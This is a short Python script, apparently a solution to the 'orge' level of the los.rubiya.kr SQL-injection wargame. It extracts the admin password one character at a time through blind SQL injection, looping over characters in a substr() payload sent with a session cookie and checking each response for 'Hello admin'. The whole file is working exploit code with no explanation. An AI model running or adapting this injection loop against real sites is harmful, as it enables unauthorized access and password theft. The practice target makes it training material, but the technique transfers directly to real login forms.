import urllib.request
length=8
pw=""
arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
for i in range(1,9):
	for j in range(0,62):
		url="http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw=*'||id='admin'%26%26%20substr(pw,{0},1)='{ascii}'%20%23".format(i,ascii=arr[j])
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
		data = urllib.request.urlopen(r).read().decode("utf-8")
		print(url)
		if data.find("Hello admin") != -1 :
			pw = pw + arr[j]
			print("This is    "+arr[j])
			break
print(pw)